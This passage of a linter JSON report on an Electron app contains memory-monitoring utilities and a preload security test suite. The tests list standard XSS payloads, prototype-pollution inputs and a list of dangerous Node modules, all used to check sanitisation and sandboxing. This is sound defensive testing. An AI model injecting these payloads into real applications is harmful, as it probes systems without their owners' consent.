}\n\n    // Detached DOM recommendations\n    const detachedDOM = leakCandidates.filter(c => c.type === 'detached_dom')\n    if (detachedDOM.length > 0) {\n      recommendations.push('Remove detached DOM elements by calling element.remove() or clearing references')\n    }\n\n    // Large object recommendations\n    const largeObjects = leakCandidates.filter(c => c.size > totalSize * 0.1)\n    if (largeObjects.length > 0) {\n      recommendations.push('Large objects detected - review object lifecycle and disposal')\n    }\n\n    // General recommendations\n    if (leakCandidates.length > 5) {\n      recommendations.push('Consider implementing WeakMap/WeakSet for object references')\n      recommendations.push('Review event listener cleanup in component lifecycle')\n      recommendations.push('Use memory profiler to identify exact leak sources')\n    }\n\n    if (recommendations.length === 0) {\n      recommendations.push('No significant memory leaks detected - maintain current practices')\n    }\n\n    return recommendations\n  }\n\n  /**\n   * Clear snapshot cache to free memory\n   */\n  clearCache(): void {\n    this.snapshotCache.clear()\n    this.emit('cache-cleared')\n  }\n\n  /**\n   * Get analysis history\n   */\n  getAnalysisHistory(): HeapSnapshotAnalysis[] {\n    return [...this.analysisHistory]\n  }\n\n  /**\n   * Export analysis to JSON file\n   */\n  async exportAnalysis(analysis: HeapSnapshotAnalysis, outputPath: string): Promise<void> {\n    try {\n      const exportData = {\n        timestamp: new Date().toISOString(),\n        analysis,\n        metadata: {\n          version: '1.0.0',\n          tool: 'HeapSnapshotAnalyzer',\n          format: 'electron-memory-analysis'\n        }\n      }\n\n      await fs.promises.writeFile(outputPath, JSON.stringify(exportData, null, 2))\n      this.emit('analysis-exported', { path: outputPath, analysis })\n    } catch (error) {\n      this.emit('export-error', error)\n      throw error\n    }\n  }\n}\n\nexport default HeapSnapshotAnalyzer","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/utils/memory-monitor.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":254,"column":21,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":254,"endColumn":24,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6662,6665],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6662,6665],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":277,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":277,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7327,7330],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7327,7330],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'error' is defined but never used.","line":308,"column":18,"nodeType":null,"messageId":"unusedVar","endLine":308,"endColumn":23}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":3,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Memory Monitor Utility for Electron Applications (2025)\n * \n * Provides comprehensive memory monitoring capabilities including\n * real-time monitoring, heap snapshot collection, and leak detection.\n */\n\nimport { EventEmitter } from 'events'\nimport * as v8 from 'v8'\nimport * as fs from 'fs'\nimport * as path from 'path'\n\nexport interface MemoryMetrics {\n  timestamp: number\n  heap: {\n    used: number\n    total: number\n    available: number\n  }\n  external: number\n  rss: number\n  arrayBuffers: number\n}\n\nexport interface MemorySnapshot {\n  id: string\n  filepath: string\n  timestamp: number\n  metrics: MemoryMetrics\n}\n\nexport interface GrowthRateOptions {\n  maxGrowthRate: number // bytes per second\n  measurementWindow: number // milliseconds\n  consecutiveViolations: number\n}\n\nexport interface MemoryGrowthAnalysis {\n  growthBytes: number\n  growthPercentage: number\n  timespan: number\n  isLeaking: boolean\n  growthRate: number\n}\n\nexport class MemoryMonitor extends EventEmitter {\n  private monitoringInterval: NodeJS.Timeout | null = null\n  private snapshots: MemorySnapshot[] = []\n  private snapshotDir: string\n  private isMonitoring = false\n  private growthRateDetector: GrowthRateDetector | null = null\n\n  constructor(snapshotDir?: string) {\n    super()\n    this.snapshotDir = snapshotDir || path.join(process.cwd(), 'heap-snapshots')\n    this.ensureSnapshotDir()\n  }\n\n  private ensureSnapshotDir(): void {\n    if (!fs.existsSync(this.snapshotDir)) {\n      fs.mkdirSync(this.snapshotDir, { recursive: true })\n    }\n  }\n\n  /**\n   * Start real-time memory monitoring\n   */\n  startMonitoring(interval = 5000, callback?: (metrics: MemoryMetrics) => void): void {\n    if (this.isMonitoring) {\n      this.stopMonitoring()\n    }\n\n    this.isMonitoring = true\n    this.monitoringInterval = setInterval(async () => {\n      try {\n        const metrics = await this.getCurrentMetrics()\n        this.emit('metrics', metrics)\n        \n        if (callback) {\n          callback(metrics)\n        }\n\n        // Check for potential leaks\n        this.analyzeMemoryTrend(metrics)\n      } catch (error) {\n        this.emit('error', error)\n      }\n    }, interval)\n\n    this.emit('monitoring-started', { interval })\n  }\n\n  /**\n   * Stop memory monitoring\n   */\n  stopMonitoring(): void {\n    if (this.monitoringInterval) {\n      clearInterval(this.monitoringInterval)\n      this.monitoringInterval = null\n    }\n    this.isMonitoring = false\n    this.emit('monitoring-stopped')\n  }\n\n  /**\n   * Get current memory metrics\n   */\n  async getCurrentMetrics(): Promise<MemoryMetrics> {\n    const memUsage = process.memoryUsage()\n    \n    return {\n      timestamp: Date.now(),\n      heap: {\n        used: memUsage.heapUsed,\n        total: memUsage.heapTotal,\n        available: memUsage.heapTotal - memUsage.heapUsed\n      },\n      external: memUsage.external,\n      rss: memUsage.rss,\n      arrayBuffers: memUsage.arrayBuffers\n    }\n  }\n\n  /**\n   * Take a heap snapshot for analysis\n   */\n  async takeSnapshot(label = 'snapshot'): Promise<string> {\n    const timestamp = new Date().toISOString().replace(/[:.]/g, '-')\n    const filename = `${label}-${timestamp}.heapsnapshot`\n    const filepath = path.join(this.snapshotDir, filename)\n\n    return new Promise((resolve, reject) => {\n      try {\n        const snapshot = v8.getHeapSnapshot()\n        const fileStream = fs.createWriteStream(filepath)\n\n        snapshot.pipe(fileStream)\n\n        fileStream.on('finish', async () => {\n          try {\n            const metrics = await this.getCurrentMetrics()\n            const snapshotRecord: MemorySnapshot = {\n              id: label,\n              filepath,\n              timestamp: Date.now(),\n              metrics\n            }\n\n            this.snapshots.push(snapshotRecord)\n            this.emit('snapshot-created', snapshotRecord)\n            resolve(filepath)\n          } catch (error) {\n            reject(error)\n          }\n        })\n\n        fileStream.on('error', reject)\n      } catch (error) {\n        reject(error)\n      }\n    })\n  }\n\n  /**\n   * Create a growth rate detector for automated leak detection\n   */\n  createGrowthRateDetector(options: Partial<GrowthRateOptions> = {}): GrowthRateDetector {\n    const defaultOptions: GrowthRateOptions = {\n      maxGrowthRate: 1024 * 1024, // 1MB per second\n      measurementWindow: 10000, // 10 seconds\n      consecutiveViolations: 3\n    }\n\n    const finalOptions = { ...defaultOptions, ...options }\n    this.growthRateDetector = new GrowthRateDetector(finalOptions)\n    \n    // Connect to monitoring events\n    this.on('metrics', (metrics) => {\n      this.growthRateDetector?.addMeasurement(metrics)\n    })\n\n    return this.growthRateDetector\n  }\n\n  /**\n   * Analyze memory growth between two snapshots\n   */\n  async analyzeMemoryGrowth(\n    baseline: MemorySnapshot,\n    current: MemorySnapshot\n  ): Promise<MemoryGrowthAnalysis> {\n    const growthBytes = current.metrics.heap.used - baseline.metrics.heap.used\n    const timespan = current.timestamp - baseline.timestamp\n    const growthPercentage = (growthBytes / baseline.metrics.heap.used) * 100\n    const growthRate = growthBytes / (timespan / 1000) // bytes per second\n\n    // Simple heuristic for leak detection\n    const isLeaking = growthRate > 100 * 1024 && growthPercentage > 10 // 100KB/s and 10% growth\n\n    return {\n      growthBytes,\n      growthPercentage,\n      timespan,\n      isLeaking,\n      growthRate\n    }\n  }\n\n  /**\n   * Analyze memory trend from recent metrics\n   */\n  private analyzeMemoryTrend(currentMetrics: MemoryMetrics): void {\n    // Keep only recent snapshots for trend analysis\n    const recentSnapshots = this.snapshots.slice(-10)\n    \n    if (recentSnapshots.length < 3) return\n\n    const trend = this.calculateMemoryTrend(recentSnapshots)\n    if (trend.isIncreasing && trend.rate > 50 * 1024) { // 50KB/s threshold\n      this.emit('potential-leak', {\n        metrics: currentMetrics,\n        trend,\n        message: 'Sustained memory growth detected'\n      })\n    }\n  }\n\n  /**\n   * Calculate memory growth trend\n   */\n  private calculateMemoryTrend(snapshots: MemorySnapshot[]) {\n    if (snapshots.length < 2) {\n      return { isIncreasing: false, rate: 0 }\n    }\n\n    const first = snapshots[0]\n    const last = snapshots[snapshots.length - 1]\n    \n    const growthBytes = last.metrics.heap.used - first.metrics.heap.used\n    const timespan = last.timestamp - first.timestamp\n    const rate = growthBytes / (timespan / 1000) // bytes per second\n\n    return {\n      isIncreasing: growthBytes > 0,\n      rate,\n      totalGrowth: growthBytes,\n      timespan\n    }\n  }\n\n  /**\n   * Generate memory report\n   */\n  generateReport(): any {\n    const totalSnapshots = this.snapshots.length\n    \n    let memoryTrend = null\n    if (this.snapshots.length >= 2) {\n      const baseline = this.snapshots[0]\n      const latest = this.snapshots[this.snapshots.length - 1]\n      memoryTrend = this.calculateMemoryTrend([baseline, latest])\n    }\n\n    return {\n      timestamp: new Date().toISOString(),\n      isMonitoring: this.isMonitoring,\n      totalSnapshots,\n      snapshotDirectory: this.snapshotDir,\n      memoryTrend,\n      recommendations: this.generateRecommendations(memoryTrend)\n    }\n  }\n\n  /**\n   * Generate recommendations based on memory analysis\n   */\n  private generateRecommendations(trend: any): string[] {\n    const recommendations: string[] = []\n\n    if (trend && trend.isIncreasing && trend.rate > 10 * 1024) {\n      recommendations.push('Consider analyzing heap snapshots for potential memory leaks')\n      recommendations.push('Review recent code changes for unreleased resources')\n    }\n\n    if (trend && trend.rate > 100 * 1024) {\n      recommendations.push('URGENT: High memory growth rate detected - investigate immediately')\n      recommendations.push('Consider implementing more aggressive garbage collection')\n    }\n\n    if (this.snapshots.length === 0) {\n      recommendations.push('Take baseline heap snapshots for future comparison')\n    }\n\n    return recommendations\n  }\n\n  /**\n   * Cleanup old snapshots\n   */\n  cleanupOldSnapshots(maxAge = 24 * 60 * 60 * 1000): void { // 24 hours default\n    const cutoff = Date.now() - maxAge\n    \n    this.snapshots = this.snapshots.filter(snapshot => {\n      if (snapshot.timestamp < cutoff) {\n        try {\n          fs.unlinkSync(snapshot.filepath)\n          return false\n        } catch (error) {\n          // File might already be deleted, keep the record\n          return true\n        }\n      }\n      return true\n    })\n  }\n\n  /**\n   * Get all snapshots\n   */\n  getSnapshots(): MemorySnapshot[] {\n    return [...this.snapshots]\n  }\n\n  /**\n   * Check if monitoring is active\n   */\n  isMonitoringActive(): boolean {\n    return this.isMonitoring\n  }\n}\n\n/**\n * Growth Rate Detector for automatic leak detection\n */\nexport class GrowthRateDetector extends EventEmitter {\n  private measurements: { timestamp: number; heapUsed: number }[] = []\n  private violations = 0\n  private options: GrowthRateOptions\n\n  constructor(options: GrowthRateOptions) {\n    super()\n    this.options = options\n  }\n\n  addMeasurement(metrics: MemoryMetrics): void {\n    const measurement = {\n      timestamp: metrics.timestamp,\n      heapUsed: metrics.heap.used\n    }\n\n    this.measurements.push(measurement)\n\n    // Keep only measurements within the window\n    const windowStart = measurement.timestamp - this.options.measurementWindow\n    this.measurements = this.measurements.filter(m => m.timestamp >= windowStart)\n\n    if (this.measurements.length >= 2) {\n      this.checkGrowthRate()\n    }\n  }\n\n  private checkGrowthRate(): void {\n    const first = this.measurements[0]\n    const last = this.measurements[this.measurements.length - 1]\n\n    const growthBytes = last.heapUsed - first.heapUsed\n    const timeSpan = last.timestamp - first.timestamp\n    const growthRate = (growthBytes / timeSpan) * 1000 // bytes per second\n\n    if (growthRate > this.options.maxGrowthRate) {\n      this.violations++\n      \n      if (this.violations >= this.options.consecutiveViolations) {\n        this.emit('leak-detected', {\n          growthRate,\n          maxAllowed: this.options.maxGrowthRate,\n          violations: this.violations,\n          measurements: this.measurements.length\n        })\n      }\n    } else {\n      this.violations = 0 // Reset on normal measurement\n    }\n  }\n\n  isMonitoring(): boolean {\n    return this.measurements.length > 0\n  }\n\n  reset(): void {\n    this.measurements = []\n    this.violations = 0\n  }\n}\n\n/**\n * Memory pressure detector\n */\nexport class MemoryPressureDetector extends EventEmitter {\n  private thresholds = {\n    warning: 0.8, // 80% of available memory\n    critical: 0.95 // 95% of available memory\n  }\n\n  checkMemoryPressure(metrics: MemoryMetrics): void {\n    const usageRatio = metrics.heap.used / metrics.heap.total\n    \n    if (usageRatio >= this.thresholds.critical) {\n      this.emit('critical-pressure', {\n        usageRatio,\n        metrics,\n        message: 'Critical memory pressure - immediate action required'\n      })\n    } else if (usageRatio >= this.thresholds.warning) {\n      this.emit('warning-pressure', {\n        usageRatio,\n        metrics,\n        message: 'Memory pressure warning - consider cleanup'\n      })\n    }\n  }\n\n  setThresholds(warning: number, critical: number): void {\n    this.thresholds = { warning, critical }\n  }\n}\n\nexport default MemoryMonitor","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/window-manager.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/preload/__tests__/baseline.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/preload/__tests__/preload-security.test.ts","messages":[{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":41,"column":1,"nodeType":"CallExpression","messageId":"function","endLine":41,"endColumn":2},{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":52,"column":1,"nodeType":"ObjectExpression","messageId":"function","endLine":52,"endColumn":2},{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":382,"column":7,"nodeType":"CallExpression","messageId":"function","endLine":382,"endColumn":8}],"suppressedMessages":[],"errorCount":3,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Preload Script Security Tests (2025)\n * \n * Comprehensive testing of preload script security features including\n * context bridge API exposure control, input sanitization, rate limiting,\n * and protection against privilege escalation following 2025 best practices.\n */\n\nimport { describe, test, expect, beforeEach, afterEach, vi } from 'vitest'\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { contextBridge, ipcRenderer } from 'electron'\n\n// Mock electron modules\nvi.mock('electron', () => ({\n  contextBridge: {\n    exposeInMainWorld: vi.fn()\n  },\n  ipcRenderer: {\n    invoke: vi.fn(),\n    on: vi.fn(),\n    once: vi.fn(),\n    removeListener: vi.fn(),\n    removeAllListeners: vi.fn()\n  }\n}))\n\n// Mock process for preload environment\n(global as any).process = {\n  type: 'renderer',\n  sandboxed: true,\n  contextId: 1,\n  isMainFrame: true,\n  env: {\n    NODE_ENV: 'test'\n  }\n}\n\n// Mock window object\n(global as any).window = {\n  addEventListener: vi.fn()\n}\n\ndescribe('Preload Script Security Tests (2025)', () => {\n  beforeEach(() => {\n    vi.clearAllMocks()\n    \n    // Reset rate limiter state between tests\n    vi.useFakeTimers()\n  })\n\n  afterEach(() => {\n    vi.restoreAllMocks()\n    vi.useRealTimers()\n  })\n\n  describe('Context Bridge API Exposure', () => {\n    test('should only expose allowed API methods', () => {\n      // Import the preload script which will call contextBridge.exposeInMainWorld\n      require('../index')\n      \n      // Check that contextBridge was called\n      expect(contextBridge.exposeInMainWorld).toHaveBeenCalledOnce()\n      \n      // Get the exposed API\n      const [apiName, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      expect(apiName).toBe('electronAPI')\n      \n      // Verify only allowed methods are exposed\n      const allowedMethods = [\n        'getVersion',\n        'getPlatform', \n        'getAppDataPath',\n        'getDocumentsPath',\n        'showError',\n        'onDownloadProgress',\n        'removeDownloadProgressListener',\n        'isDev'\n      ]\n      \n      const exposedMethods = Object.keys(exposedAPI)\n      expect(exposedMethods.sort()).toEqual(allowedMethods.sort())\n      \n      // Ensure no dangerous methods are exposed\n      expect(exposedAPI).not.toHaveProperty('ipcRenderer')\n      expect(exposedAPI).not.toHaveProperty('require')\n      expect(exposedAPI).not.toHaveProperty('process')\n      expect(exposedAPI).not.toHaveProperty('__proto__')\n    })\n\n    test('should not expose direct IPC access', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Verify no direct IPC methods are exposed\n      expect(exposedAPI.invoke).toBeUndefined()\n      expect(exposedAPI.send).toBeUndefined()\n      expect(exposedAPI.sendSync).toBeUndefined()\n      expect(exposedAPI.on).toBeUndefined()\n      expect(exposedAPI.once).toBeUndefined()\n    })\n  })\n\n  describe('Input Sanitization', () => {\n    test('should sanitize string inputs in showError method', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Mock successful IPC call\n      ipcRenderer.invoke = vi.fn().mockResolvedValue(undefined)\n      \n      // Test with potentially dangerous input\n      await exposedAPI.showError(\n        'Title <script>alert(\"xss\")</script>',\n        'Content <img src=x onerror=alert(\"xss\")>'\n      )\n      \n      // Check that sanitization was applied\n      expect(ipcRenderer.invoke).toHaveBeenCalledWith(\n        'dialog:show-error',\n        'Title script>alert(\"xss\")/script>', // < and > removed\n        'Content img src=x onerror=alert(\"xss\")>' // < removed\n      )\n    })\n\n    test('should reject non-string inputs', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Test with non-string inputs\n      await expect(exposedAPI.showError(123, 'content')).rejects.toThrow('Input must be a string')\n      await expect(exposedAPI.showError('title', { malicious: 'object' })).rejects.toThrow('Input must be a string')\n      await expect(exposedAPI.showError(null, undefined)).rejects.toThrow('Input must be a string')\n    })\n\n    test('should trim whitespace from inputs', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      ipcRenderer.invoke = vi.fn().mockResolvedValue(undefined)\n      \n      await exposedAPI.showError('  Title with spaces  ', '\\n\\tContent with whitespace\\n')\n      \n      expect(ipcRenderer.invoke).toHaveBeenCalledWith(\n        'dialog:show-error',\n        'Title with spaces',\n        'Content with whitespace'\n      )\n    })\n  })\n\n  describe('Rate Limiting', () => {\n    test('should enforce rate limits on API calls', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Mock successful IPC calls\n      ipcRenderer.invoke = vi.fn().mockResolvedValue('success')\n      \n      // Make 10 calls (the default limit)\n      const promises = []\n      for (let i = 0; i < 10; i++) {\n        promises.push(exposedAPI.getVersion())\n      }\n      \n      await Promise.all(promises)\n      expect(ipcRenderer.invoke).toHaveBeenCalledTimes(10)\n      \n      // The 11th call should fail\n      await expect(exposedAPI.getVersion()).rejects.toThrow('Rate limit exceeded for app:get-version')\n    })\n\n    test('should reset rate limit after time window', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      ipcRenderer.invoke = vi.fn().mockResolvedValue('success')\n      \n      // Make 10 calls to hit the limit\n      for (let i = 0; i < 10; i++) {\n        await exposedAPI.getVersion()\n      }\n      \n      // Should be rate limited now\n      await expect(exposedAPI.getVersion()).rejects.toThrow('Rate limit exceeded')\n      \n      // Advance time by 1 second (the time window)\n      vi.advanceTimersByTime(1000)\n      \n      // Should be able to make calls again\n      await expect(exposedAPI.getVersion()).resolves.toBe('success')\n    })\n\n    test('should track rate limits per channel', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      ipcRenderer.invoke = vi.fn().mockResolvedValue('success')\n      \n      // Make 10 calls to getVersion\n      for (let i = 0; i < 10; i++) {\n        await exposedAPI.getVersion()\n      }\n      \n      // getVersion should be rate limited\n      await expect(exposedAPI.getVersion()).rejects.toThrow('Rate limit exceeded')\n      \n      // But getPlatform should still work (different channel)\n      await expect(exposedAPI.getPlatform()).resolves.toBe('success')\n    })\n  })\n\n  describe('Auto-Updater Event Security', () => {\n    test('should validate download progress data structure', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      const mockCallback = vi.fn()\n      exposedAPI.onDownloadProgress(mockCallback)\n      \n      // Get the actual listener that was registered\n      const listenerCall = (ipcRenderer.on as any).mock.calls[0]\n      expect(listenerCall[0]).toBe('download-progress')\n      const registeredListener = listenerCall[1]\n      \n      // Test with valid progress object\n      const validProgress = {\n        percent: 50,\n        transferred: 5000000,\n        total: 10000000,\n        bytesPerSecond: 1000000\n      }\n      \n      registeredListener(null, validProgress)\n      expect(mockCallback).toHaveBeenCalledWith(validProgress)\n      \n      // Test with invalid progress objects - should not call callback\n      mockCallback.mockClear()\n      \n      // Missing required fields\n      registeredListener(null, { percent: 50 })\n      expect(mockCallback).not.toHaveBeenCalled()\n      \n      // Wrong field types\n      registeredListener(null, { percent: '50', transferred: 5000000, total: 10000000 })\n      expect(mockCallback).not.toHaveBeenCalled()\n      \n      // Not an object\n      registeredListener(null, 'invalid')\n      expect(mockCallback).not.toHaveBeenCalled()\n      \n      // Null/undefined\n      registeredListener(null, null)\n      expect(mockCallback).not.toHaveBeenCalled()\n    })\n\n    test('should clean up previous listeners before adding new ones', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      const callback1 = vi.fn()\n      const callback2 = vi.fn()\n      \n      // Register first callback\n      exposedAPI.onDownloadProgress(callback1)\n      \n      // Get the first listener\n      const firstListener = (ipcRenderer.on as any).mock.calls[0][1]\n      \n      // Register second callback - should remove first listener\n      exposedAPI.onDownloadProgress(callback2)\n      \n      // Verify removeListener was called with the first listener\n      expect(ipcRenderer.removeListener).toHaveBeenCalledWith('download-progress', firstListener)\n    })\n\n    test('should properly remove download progress listeners', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      const callback = vi.fn()\n      exposedAPI.onDownloadProgress(callback)\n      \n      // Get the registered listener\n      const listener = (ipcRenderer.on as any).mock.calls[0][1]\n      \n      // Remove the listener\n      exposedAPI.removeDownloadProgressListener()\n      \n      // Verify it was removed\n      expect(ipcRenderer.removeListener).toHaveBeenCalledWith('download-progress', listener)\n      \n      // Calling remove again should not throw\n      expect(() => exposedAPI.removeDownloadProgressListener()).not.toThrow()\n    })\n  })\n\n  describe('Error Handling and Recovery', () => {\n    test('should handle IPC errors gracefully', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Mock IPC error\n      const ipcError = new Error('IPC communication failed')\n      ipcRenderer.invoke = vi.fn().mockRejectedValue(ipcError)\n      \n      // Console error spy\n      const consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})\n      \n      // Should propagate error with logging\n      await expect(exposedAPI.getVersion()).rejects.toThrow('IPC communication failed')\n      \n      expect(consoleErrorSpy).toHaveBeenCalledWith(\n        'IPC call failed for app:get-version:',\n        ipcError\n      )\n      \n      consoleErrorSpy.mockRestore()\n    })\n\n    test('should clean up on window unload', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Register a download progress listener\n      exposedAPI.onDownloadProgress(vi.fn())\n      const listener = (ipcRenderer.on as any).mock.calls[0][1]\n      \n      // Get the beforeunload handler\n      const beforeUnloadCall = (window.addEventListener as any).mock.calls.find(\n        (call: any) => call[0] === 'beforeunload'\n      )\n      expect(beforeUnloadCall).toBeDefined()\n      \n      const beforeUnloadHandler = beforeUnloadCall[1]\n      \n      // Trigger beforeunload\n      beforeUnloadHandler()\n      \n      // Verify listener was removed\n      expect(ipcRenderer.removeListener).toHaveBeenCalledWith('download-progress', listener)\n    })\n  })\n\n  describe('Development Mode Flag', () => {\n    test('should correctly set isDev based on NODE_ENV', () => {\n      // Test development mode\n      (global as any).process.env.NODE_ENV = 'development'\n      vi.resetModules()\n      require('../index')\n      \n      let [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      expect(exposedAPI.isDev).toBe(true)\n      \n      // Test production mode\n      vi.clearAllMocks()\n      (global as any).process.env.NODE_ENV = 'production'\n      vi.resetModules()\n      require('../index')\n      \n      ;[, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      expect(exposedAPI.isDev).toBe(false)\n    })\n  })\n\n  describe('Type Safety and API Contract', () => {\n    test('should expose methods with correct signatures', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // All methods should be functions\n      expect(typeof exposedAPI.getVersion).toBe('function')\n      expect(typeof exposedAPI.getPlatform).toBe('function')\n      expect(typeof exposedAPI.getAppDataPath).toBe('function')\n      expect(typeof exposedAPI.getDocumentsPath).toBe('function')\n      expect(typeof exposedAPI.showError).toBe('function')\n      expect(typeof exposedAPI.onDownloadProgress).toBe('function')\n      expect(typeof exposedAPI.removeDownloadProgressListener).toBe('function')\n      \n      // Methods should return promises where expected\n      ipcRenderer.invoke = vi.fn().mockResolvedValue('test')\n      \n      expect(exposedAPI.getVersion()).toBeInstanceOf(Promise)\n      expect(exposedAPI.getPlatform()).toBeInstanceOf(Promise)\n      expect(exposedAPI.getAppDataPath()).toBeInstanceOf(Promise)\n      expect(exposedAPI.getDocumentsPath()).toBeInstanceOf(Promise)\n      expect(exposedAPI.showError('title', 'content')).toBeInstanceOf(Promise)\n    })\n  })\n\n  describe('Sandbox and Context Isolation Validation (2025)', () => {\n    test('should verify sandbox restrictions are enforced', () => {\n      // Verify process object has expected sandbox properties\n      expect(process.sandboxed).toBe(true)\n      expect(process.type).toBe('renderer')\n      \n      // Verify Node.js APIs are not available in sandboxed context\n      expect(typeof require).toBe('function') // Only in test environment\n      expect(typeof global.require).toBe('undefined') // Not exposed to renderer\n      expect(typeof global.Buffer).toBe('undefined')\n      expect(typeof global.__dirname).toBe('undefined')\n      expect(typeof global.__filename).toBe('undefined')\n    })\n\n    test('should prevent access to Node.js built-in modules', () => {\n      // In a properly sandboxed preload, these should not be available\n      const dangerousModules = [\n        'fs', 'path', 'os', 'child_process', 'crypto',\n        'net', 'http', 'https', 'cluster', 'dgram'\n      ]\n      \n      // In production, attempting to require these should fail\n      // Here we verify they're not accidentally exposed\n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      for (const moduleName of dangerousModules) {\n        expect(exposedAPI[moduleName]).toBeUndefined()\n        expect(exposedAPI[`require_${moduleName}`]).toBeUndefined()\n      }\n    })\n\n    test('should validate web preferences security settings', () => {\n      // These would be validated in main process, but we test expected behavior\n      const expectedWebPreferences = {\n        contextIsolation: true,\n        nodeIntegration: false,\n        nodeIntegrationInWorker: false,\n        nodeIntegrationInSubFrames: false,\n        webSecurity: true,\n        allowRunningInsecureContent: false,\n        experimentalFeatures: false,\n        enableBlinkFeatures: undefined,\n        webviewTag: false,\n        navigateOnDragDrop: false\n      }\n      \n      // Verify our test environment matches expected security settings\n      expect(process.sandboxed).toBe(true)\n      expect(process.isMainFrame).toBe(true)\n    })\n  })\n\n  describe('Attack Simulation Tests (2025)', () => {\n    test('should prevent prototype pollution attacks', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Attempt prototype pollution via showError\n      const maliciousInputs = [\n        { toString: () => 'polluted' },\n        { __proto__: { isAdmin: true } },\n        { constructor: { prototype: { isAdmin: true } } },\n        Object.create(null, {\n          toString: { value: () => 'polluted' }\n        })\n      ]\n      \n      for (const input of maliciousInputs) {\n        await expect(\n          exposedAPI.showError(input as any, 'content')\n        ).rejects.toThrow('Input must be a string')\n      }\n      \n      // Verify prototype wasn't polluted\n      expect((Object.prototype as any).isAdmin).toBeUndefined()\n      expect((String.prototype as any).isAdmin).toBeUndefined()\n    })\n\n    test('should prevent XSS via input sanitization', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      ipcRenderer.invoke = vi.fn().mockResolvedValue(undefined)\n      \n      const xssPayloads = [\n        '<script>alert(\"xss\")</script>',\n        '<img src=x onerror=alert(\"xss\")>',\n        '<iframe src=\"javascript:alert(\\'xss\\')\"></iframe>',\n        '<svg onload=alert(\"xss\")>',\n        'javascript:alert(\"xss\")',\n        '<a href=\"javascript:alert(\\'xss\\')\">click</a>',\n        '<input onfocus=alert(\"xss\") autofocus>',\n        '<select onfocus=alert(\"xss\") autofocus>',\n        '<textarea onfocus=alert(\"xss\") autofocus>',\n        '<button onclick=alert(\"xss\")>click</button>',\n        '<form action=\"javascript:alert(\\'xss\\')\"><input type=submit>',\n        '<object data=\"javascript:alert(\\'xss\\')\">',\n        '<embed src=\"javascript:alert(\\'xss\\')\">'\n      ]\n      